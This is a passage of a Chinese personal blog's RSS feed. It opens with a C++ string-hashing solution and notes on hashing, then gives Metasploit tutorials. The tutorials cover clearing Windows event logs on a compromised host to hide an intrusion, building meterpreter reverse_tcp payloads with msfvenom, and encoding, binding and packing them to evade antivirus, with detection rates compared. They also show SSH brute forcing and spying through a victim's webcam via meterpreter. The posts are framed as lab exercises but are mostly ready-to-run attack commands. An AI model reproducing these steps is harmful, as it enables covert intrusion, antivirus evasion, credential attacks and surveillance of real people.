&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef unsigned long long ull;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull base=131;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull po[100010],hs[100010*100];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char s1[100010],s2[100010*100];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int n,ans=1,T;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull geth(int l,int r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return (ull)hs[r]-po[r-l+1]*hs[l-1];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    freopen(&amp;quot;oulipo.in&amp;quot;,&amp;quot;r&amp;quot;,stdin);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    freopen(&amp;quot;oulipo.out&amp;quot;,&amp;quot;w&amp;quot;,stdout);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    po[0]=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=1;i&amp;lt;=10010-5;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        po[i]=po[i-1]*base;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    scanf(&amp;quot;%d&amp;quot;,&amp;amp;T);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while(T--)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        scanf(&amp;quot;%s%s&amp;quot;,s1+1,s2+1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int l1=strlen(s1+1),l2=strlen(s2+1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ull a1=0,ans=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for (int i=1;i&amp;lt;=l1;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            a1=a1*base+(ull)s1[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for (int i=1;i&amp;lt;=l2;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            hs[i]=hs[i-1]*base+s2[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for (int i=1;i+l1-1&amp;lt;=l2;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            if (a1==geth(i,i+l1-1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ans++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        printf(&amp;quot;%d\n&amp;quot;,ans);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;hash好像可以暴力水过很多字符串算法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hash好像可以暴力水过很多字符串算法&#34;&gt;#&lt;/a&gt; hash 好像可以暴力水过很多字符串算法。。&lt;/h2&gt;
&lt;p&gt;1、kmp&lt;/p&gt;
&lt;p&gt;问题：给两个字符串 S1，S2，求 S2 是否是 S1 的子串，并求 S2 在 S1 中出现的次数&lt;/p&gt;
&lt;p&gt;把 S2 Hash 出来，在 S1 里找所有长度为 | S2|&lt;/p&gt;
&lt;p&gt;2、AC 自动机&lt;/p&gt;
&lt;p&gt;问题：给 N 个单词串，和一个文章串，求每个单词串是否是文章串的子串，并求每个单词在文章中出现的次数。&lt;/p&gt;
&lt;p&gt;把每一个单词 hash 成整数，再把文章的每一个子串 hash 成整数，接下来只需要进行整数上的查找即可。&lt;/p&gt;
&lt;p&gt;复杂度：O (|A|2+|S|)&lt;/p&gt;
&lt;p&gt;用 AC 自动机可以做到 O (|A|+|S|)&lt;/p&gt;
&lt;p&gt;3、后缀数组&lt;/p&gt;
&lt;p&gt;问题：给两个字符串 S1,S2，求它们的最长公共子串的长度。&lt;/p&gt;
&lt;p&gt;将 S1 的每一个子串都 hash 成一个整数，将 S2 的每一个子串都 hash 成一个整数&lt;/p&gt;
&lt;p&gt;两堆整数，相同的配对，并且找到所表示的字符串长度最大的即可。&lt;/p&gt;
&lt;p&gt;复杂度：O (|S1|2+|S2|2)&lt;/p&gt;
&lt;p&gt;用后缀数组可以优化到 O (|S|log|S|)&lt;/p&gt;
&lt;p&gt;4、马拉车&lt;/p&gt;
&lt;p&gt;问题：给一个字符串 S，求 S 的最长回文子串。&lt;/p&gt;
&lt;p&gt;先求子串长度位奇数的，再求偶数的。枚举回文子串的中心位置，然后二分子串的长度，直到找到一个该位置的最长回文子串，不断维护长度最大值即可。&lt;/p&gt;
&lt;p&gt;复杂度：O (|S|log|S|)&lt;/p&gt;
&lt;p&gt;用 manacher 可以做到 O (|S|)&lt;/p&gt;
&lt;p&gt;5、扩展 kmp&lt;/p&gt;
&lt;p&gt;问题：给一个字符串 S，求 S 的每个后缀与 S 的最长公共前缀&lt;/p&gt;
&lt;p&gt;枚举每一个后缀的起始位置，二分长度，求出每个后缀与 S 的最长公共前缀。&lt;/p&gt;
&lt;p&gt;复杂度：O (|S|log|S|)&lt;/p&gt;
&lt;p&gt;用 extend-kmp 可以做到 O (|S|)&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/msf%E6%B8%85%E7%90%86%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/</guid>
            <title>msf清理事件日志</title>
            <link>https://mangpumo.github.io/2023/01/12/msf%E6%B8%85%E7%90%86%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/</link>
            <pubDate>Thu, 12 Jan 2023 22:18:52 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;再进入肉鸡执行一些操作时，windows 下记录的操作日志可在日志查看器中进行查看，可以通过运行 eventvwr 命令打开。包括了应用程序、系统、安全等模块的日志，为了不让其查到自己或知道自己的操作，则可以使用 meterpreter 的 clearev 命令来清除其日志。未清除日志前可查看系统记录的一些处理信息。&lt;/p&gt;
&lt;p&gt;![1645511582659](03 msf 清理事件日志.assets/1645511582659.png)&lt;/p&gt;
&lt;p&gt;然后在 meterpreter 下执行 clearev 命令，可以看到清除提示，分别清除了应用程序，系统和安全模块的日志记录。&lt;/p&gt;
&lt;p&gt;clearev      清理日志&lt;/p&gt;
&lt;p&gt;![1645511593151](03 msf 清理事件日志.assets/1645511593151.png)&lt;/p&gt;
&lt;p&gt;（注意 使用 clearev 命令时 需要获得靶机的 system  权限）&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/msf%E5%85%8D%E6%9D%80%E7%BC%96%E7%A0%81/</guid>
            <title>msf免杀编码</title>
            <link>https://mangpumo.github.io/2023/01/12/msf%E5%85%8D%E6%9D%80%E7%BC%96%E7%A0%81/</link>
            <pubDate>Thu, 12 Jan 2023 22:18:18 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;杀软是如何检测出恶意代码的？&lt;br /&gt;
特征码、启发式恶意软件检查和行为。&lt;br /&gt;
免杀是做什么？&lt;br /&gt;
对特征进行混淆，打乱代码，避免杀毒软件查杀&lt;br /&gt;
免杀的基本方法有哪些？&lt;br /&gt;
自编码处理  自捆绑 + 编码  多重编码   接口下载式  签名伪装式&lt;/p&gt;
&lt;p&gt;针对杀毒软件的基本检测方法，我们可有以下几种方法实现免杀：&lt;/p&gt;
&lt;p&gt;改变特征码&lt;br /&gt;
改变行为&lt;br /&gt;
其它&lt;/p&gt;
&lt;p&gt;由于 msf 被各大安全厂商盯的比较紧，所以这些常规的方法免杀效果肯定是比较差的，但有时把一两种常规方法稍微结合一下就能达到比较好的免杀效果&lt;/p&gt;
&lt;p&gt;要用到的在线查毒工具 virscan 提供&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlyc2Nhbi5vcmcv&#34;&gt;https://www.virscan.org/&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;一-不处理payload直接生成样本进行检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-不处理payload直接生成样本进行检测&#34;&gt;#&lt;/a&gt; 一、不处理 payload 直接生成样本进行检测&lt;/h1&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.32 LPORT=4456 -f exe -o payload1.exe&lt;/p&gt;
&lt;p&gt;![1645511560404](02 msf 编码免杀.assets/1645511560404.png)&lt;/p&gt;
&lt;p&gt;进行查毒有 41% 的杀毒软件报毒了&lt;/p&gt;
&lt;p&gt;具体查毒链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yLnZpcnNjYW4ub3JnL2xhbmd1YWdlL2VuL3JlcG9ydC8yN2VhNTNiYWI0NGUwYTAyM2I1N2MyNzk5MWYwMmNmOQ==&#34;&gt;https://r.virscan.org/language/en/report/27ea53bab44e0a023b57c27991f02cf9&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;![1645511550808](02 msf 编码免杀.assets/1645511550808.png)&lt;/p&gt;
&lt;h1 id=&#34;二-msf自编码处理payload生成样本进行检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-msf自编码处理payload生成样本进行检测&#34;&gt;#&lt;/a&gt; 二、 MSF 自编码处理 payload 生成样本进行检测&lt;/h1&gt;
&lt;p&gt;首先我们输入   msfvenom --list encoders   查看可以用编码模块&lt;/p&gt;
&lt;p&gt;![1645511543145](02 msf 编码免杀.assets/1645511543145.png)&lt;/p&gt;
&lt;p&gt;我们使用  x86/shikata_ga_nai 模块 免杀中使用频率最高的一个编码器&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai HOST=192.168.110.110  LPORT=4456 -f exe -o payload1.exe&lt;/p&gt;
&lt;p&gt;进行查毒有 37% 的杀毒软件报毒了&lt;/p&gt;
&lt;p&gt;![1645511533351](02 msf 编码免杀.assets/1645511533351.png)&lt;/p&gt;
&lt;h1 id=&#34;三-msf自捆绑处理payload生成样本进行检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-msf自捆绑处理payload生成样本进行检测&#34;&gt;#&lt;/a&gt; 三、MSF 自捆绑处理 payload 生成样本进行检测&lt;/h1&gt;
&lt;p&gt;使用 msfvenom 的 - x 参数可以指定一个可执行文件，将 payload 与其捆绑&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -x UltraISO.exe -f exe -o payload2.exe&lt;/p&gt;
&lt;p&gt;![1645511525813](02 msf 编码免杀.assets/1645511525813.png)&lt;/p&gt;
&lt;p&gt;进行查毒有 37% 的杀毒软件报毒了&lt;/p&gt;
&lt;p&gt;![1645511516751](02 msf 编码免杀.assets/1645511516751.png)&lt;/p&gt;
&lt;h1 id=&#34;四-msf自捆绑编码处理payload生成样本进行检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四-msf自捆绑编码处理payload生成样本进行检测&#34;&gt;#&lt;/a&gt; 四、MSF 自捆绑 + 编码处理 payload 生成样本进行检测&lt;/h1&gt;
&lt;p&gt;结合第二种，第三种。编码方式我们再次生成样本&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -e x86/shikata_ga_nai -x UltraISO.exe  -i 10 -f exe -o payload3.exe&lt;/p&gt;
&lt;p&gt;![1645511507586](02 msf 编码免杀.assets/1645511507586.png)&lt;/p&gt;
&lt;p&gt;进行查毒有 31% 的杀毒软件报毒了&lt;/p&gt;
&lt;p&gt;![1645511497457](02 msf 编码免杀.assets/1645511497457.png)&lt;/p&gt;
&lt;p&gt;那我们继续增加编码次数&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -e x86/shikata_ga_nai -x UltraISO.exe  -i 20 -f exe -o payload4.exe&lt;/p&gt;
&lt;p&gt;进行查毒有 27% 的杀毒软件报毒了！&lt;/p&gt;
&lt;p&gt;![1645511487704](02 msf 编码免杀.assets/1645511487704.png)&lt;/p&gt;
&lt;h1 id=&#34;五-msf多重编码payload生成样本进行检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#五-msf多重编码payload生成样本进行检测&#34;&gt;#&lt;/a&gt; 五、MSF 多重编码 payload 生成样本进行检测&lt;/h1&gt;
&lt;p&gt;通过管道，让 msfvenom 用不同编码器反复编码进行混淆。使用管道让 msfvenom 对攻击载荷多重编码，先用 shikata_ga_nai 编码 10 次，接着来 10 次的 alpha_upper 编码，再来 10 次的 countdown 编码，最后才生成以 payload5.exe 为模板的可执行文件。&lt;/p&gt;
&lt;p&gt;msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=192.168.110.110 LPORT=4456 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x UltraISO.exe -f exe -o payload5.exe&lt;/p&gt;
&lt;h1 id=&#34;六-生成shellcode使用c语言调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#六-生成shellcode使用c语言调用&#34;&gt;#&lt;/a&gt; 六、 生成 Shellcode 使用 C 语言调用&lt;/h1&gt;
&lt;p&gt;1、直接在 linux 中利用 msf 的 meterpreter 生成的文件以.c 形式文件存储，得到机器码。命令：&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -f c &amp;gt;c0001.c&lt;/p&gt;
&lt;p&gt;![1645511458128](02 msf 编码免杀.assets/1645511458128.png)&lt;/p&gt;
&lt;p&gt;2、改 c 文件，并编译，并加壳&lt;/p&gt;
&lt;p&gt;![1645511469800](02 msf 编码免杀.assets/1645511469800.png)&lt;/p&gt;
&lt;p&gt;随便写一个 hello world&lt;/p&gt;
&lt;p&gt;main() {&lt;br /&gt;
printf(&amp;quot;hello world\n&amp;quot;);&lt;br /&gt;
}&lt;/p&gt;
&lt;p&gt;然后编译 并加壳&lt;/p&gt;
&lt;p&gt;vmp 加壳工具&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/msf%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/</guid>
            <title>msf辅助模块</title>
            <link>https://mangpumo.github.io/2023/01/12/msf%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/</link>
            <pubDate>Thu, 12 Jan 2023 22:10:07 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;说明：我们知道 msf 辅助模块有上千个，主要用于信息搜集阶段，功能包括扫描、口令猜解、敏感信息嗅探、FUZZ 测试发掘漏洞、实施网络协议欺骗等&lt;/p&gt;
&lt;h1 id=&#34;一-怎么查询-auxiliary辅助模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-怎么查询-auxiliary辅助模块&#34;&gt;#&lt;/a&gt; 一、怎么查询 Auxiliary 辅助模块&lt;/h1&gt;
&lt;p&gt;我们可以通过以下命令查询所有 Auxiliary 辅助模块&lt;/p&gt;
&lt;p&gt;use auxiliary/ 或   show auxiliary&lt;/p&gt;
&lt;h1 id=&#34;二-auxiliary辅助模块分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-auxiliary辅助模块分类&#34;&gt;#&lt;/a&gt; 二、 Auxiliary 辅助模块分类&lt;/h1&gt;
&lt;hr /&gt;
&lt;h4 id=&#34;admin&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#admin&#34;&gt;#&lt;/a&gt; admin&lt;/h4&gt;
&lt;hr /&gt;
&lt;p&gt;/admin/android&lt;/p&gt;
&lt;p&gt;/admin/http&lt;/p&gt;
&lt;p&gt;/admin/mysql/&lt;/p&gt;
&lt;p&gt;/admin/oracle/&lt;/p&gt;
&lt;p&gt;/admin/vmware/&lt;/p&gt;
&lt;p&gt;/admin/smb/&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&#34;dos&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dos&#34;&gt;#&lt;/a&gt; dos&lt;/h4&gt;
&lt;hr /&gt;
&lt;p&gt;/dos/android/&lt;/p&gt;
&lt;p&gt;/dos/http/&lt;/p&gt;
&lt;p&gt;/dos/cisco/&lt;/p&gt;
&lt;p&gt;/dos/dns/&lt;/p&gt;
&lt;p&gt;/dos/smb/&lt;/p&gt;
&lt;p&gt;/dos/windows/ftp/&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&#34;fuzzers&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fuzzers&#34;&gt;#&lt;/a&gt; fuzzers&lt;/h4&gt;
&lt;hr /&gt;
&lt;p&gt;/fuzzers/http/&lt;/p&gt;
&lt;p&gt;/fuzzers/smb/&lt;/p&gt;
&lt;p&gt;/gather/&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&#34;scanner&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#scanner&#34;&gt;#&lt;/a&gt; scanner&lt;/h4&gt;
&lt;hr /&gt;
&lt;p&gt;/scanner/portscan/&lt;/p&gt;
&lt;p&gt;/scanner/ftp/&lt;/p&gt;
&lt;p&gt;/scanner/http/&lt;/p&gt;
&lt;p&gt;/scanner/ssh/&lt;/p&gt;
&lt;p&gt;/scanner/smb/&lt;/p&gt;
&lt;p&gt;/scanner/vmware/&lt;/p&gt;
&lt;p&gt;/scanner/vnc/&lt;/p&gt;
&lt;p&gt;/scanner/telnet/&lt;/p&gt;
&lt;p&gt;/scanner/msyql/&lt;/p&gt;
&lt;p&gt;/scanner/ntp/&lt;/p&gt;
&lt;p&gt;/scanner/openvas/&lt;/p&gt;
&lt;p&gt;/scanner/sap/&lt;/p&gt;
&lt;h4 id=&#34;server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#server&#34;&gt;#&lt;/a&gt; server&lt;/h4&gt;
&lt;p&gt;/server/&lt;/p&gt;
&lt;h1 id=&#34;三-通过分类查询指定模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-通过分类查询指定模块&#34;&gt;#&lt;/a&gt; 三、通过分类查询指定模块&lt;/h1&gt;
&lt;p&gt;通过 search 查询指定模块&lt;/p&gt;
&lt;p&gt;search type:auxiliary name:smb&lt;/p&gt;
&lt;p&gt;type： 后门跟的的模块类型   name ： 后门跟的就是要搜的模块名&lt;/p&gt;
&lt;h1 id=&#34;四-怎么调用模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四-怎么调用模块&#34;&gt;#&lt;/a&gt; 四、怎么调用模块&lt;/h1&gt;
&lt;p&gt;我们调一个 smb 模块演示&lt;/p&gt;
&lt;p&gt;1 查询与 SMB	相关的辅助模块&lt;/p&gt;
&lt;p&gt;search type:auxiliary name:smb&lt;/p&gt;
&lt;p&gt;2 加载一个 ms17_010 探测模块&lt;/p&gt;
&lt;p&gt;use auxiliary/scanner/smb/smb_ms17_010&lt;/p&gt;
&lt;p&gt;3 查看载入模块需要配置的参数&lt;/p&gt;
&lt;p&gt;show options&lt;/p&gt;
&lt;p&gt;![1645511393570](01 msf 辅助模块.assets/1645511393570.png)&lt;/p&gt;
&lt;p&gt;set RHOSTS 192.168.110.110   (设定目标 IP)&lt;/p&gt;
&lt;p&gt;set THREADS 10    （如果觉得探测过慢可以增加线程，根据电脑实际性能来不要配置太多 个人建议最大 10）&lt;/p&gt;
&lt;p&gt;run （执行探测）&lt;/p&gt;
&lt;p&gt;![1645511404119](01 msf 辅助模块.assets/1645511404119.png)&lt;/p&gt;
&lt;p&gt;![1645511415106](01 msf 辅助模块.assets/1645511415106.png)&lt;/p&gt;
&lt;h1 id=&#34;五-更多&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#五-更多&#34;&gt;#&lt;/a&gt; 五、更多&lt;/h1&gt;
&lt;p&gt;1 whois 查看域名或 IP 信息  （hu yi zi）&lt;/p&gt;
&lt;p&gt;whois &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5iYWlkdS5jb20=&#34;&gt;www.baidu.com&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;whois 192.168.0.1&lt;/p&gt;
&lt;p&gt;2  利用辅助模块查找邮箱&lt;/p&gt;
&lt;p&gt;use auxiliary/gather/search_email_collector&lt;/p&gt;
&lt;p&gt;3 DNS 枚举，使用 auxiliary 模块下的 DNS 枚举模块：&lt;/p&gt;
&lt;p&gt;use auxiliary/gather/enum_dns&lt;/p&gt;
&lt;p&gt;4 ssh 爆破，使用 auxiliary 模块下的 ssh_login&lt;/p&gt;
&lt;p&gt;use /auxiliary/scanner/ssh/ssh_login&lt;/p&gt;
&lt;p&gt;set RHOSTS 192.168.1.92   (设定目标 IP)&lt;br /&gt;
 set USERNAME root    （设定 ssh 登陆账户）&lt;br /&gt;
set PASS_FILE /kevin/ssh_passwd.txt   （设定暴力字典）&lt;br /&gt;
set THREADS 100           (线程设置为 100)&lt;br /&gt;
 show options                   (查看更改后的参数) 12345&lt;/p&gt;
&lt;p&gt;run   开始爆破&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E6%91%84%E5%83%8F%E5%A4%B4/</guid>
            <title>后渗透之调摄像头</title>
            <link>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E6%91%84%E5%83%8F%E5%A4%B4/</link>
            <pubDate>Thu, 12 Jan 2023 21:41:34 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-环境准备&#34;&gt;#&lt;/a&gt; 一、环境准备&lt;/h1&gt;
&lt;p&gt;1 MSF-Metasploit Framework&lt;/p&gt;
&lt;p&gt;2 一台 windiows 靶机&lt;/p&gt;
&lt;p&gt;3 一台安卓设备，没有可以使用模拟器&lt;/p&gt;
&lt;h1 id=&#34;二-实战&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-实战&#34;&gt;#&lt;/a&gt; 二、实战&lt;/h1&gt;
&lt;p&gt;靶机获取到 meterpreter 后我们可以使用  webcam 模块实现调用软，硬件摄像头&lt;/p&gt;
&lt;p&gt;webcam 模块支持命令&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;模块名&lt;/th&gt;
&lt;th&gt;解释&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;webcam_list&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;列出靶机中的所有软，硬件摄像头列表，并编号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;webcam_snap&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;可调用单个软，硬件摄像头拍照，默认调用第一个摄像头&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;webcam_stream&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;可调用单个软，硬件摄像头直播，默认调用第一个摄像头&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;1  webcam_list&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494100592.png&#34; alt=&#34;1644494100592&#34; /&gt;&lt;/p&gt;
&lt;p&gt;2 webcam_snap  调用单个软，硬件摄像头拍照&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-h&lt;/td&gt;
&lt;td&gt;显示帮助&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;-i&lt;/td&gt;
&lt;td&gt;-i 1 “1” 代表调用摄像头编号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;-p&lt;/td&gt;
&lt;td&gt;-p  /root &amp;quot;root&amp;quot; 设置存储路径&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;-q&lt;/td&gt;
&lt;td&gt;-q  100  &amp;quot;100&amp;quot; 表示存储图片的质量默认为 50&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;-v&lt;/td&gt;
&lt;td&gt;-v  false   -v 2 个参数  true 和  false   这个参数表示拍照后自动打开，默认参数为 true&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;img data-src=&#34;%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494089950.png&#34; alt=&#34;1644494089950&#34; /&gt;&lt;/p&gt;
&lt;p&gt;3 webcam_stream  调用单个软，硬件摄像头直播&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-h&lt;/td&gt;
&lt;td&gt;显示帮助&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;-d&lt;/td&gt;
&lt;td&gt;-d 100  &amp;quot;100&amp;quot;=100 秒   设置流持续时间为 100 秒   默认为 1800&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;-i&lt;/td&gt;
&lt;td&gt;-i 1 “1” 代表调用摄像头编号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;-q&lt;/td&gt;
&lt;td&gt;-q 100 “100” 指流质量 默认为 50&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;-s&lt;/td&gt;
&lt;td&gt;-s live “live” 指流文件路径  默认输出在当前目录（注意目录不存在不会自动创建）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;-f&lt;/td&gt;
&lt;td&gt;-f live “live” 指播放文件的存储地址  默认输出在当前目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;-v&lt;/td&gt;
&lt;td&gt;-v  false   -v 2 个参数  true 和  false   这个参数表示拍照后自动打开，默认参数为 true&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%9B%91%E6%8E%A7Windows/</guid>
            <title>后渗透之远程监控Windows</title>
            <link>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%9B%91%E6%8E%A7Windows/</link>
            <pubDate>Thu, 12 Jan 2023 21:33:52 +0800</pubDate>
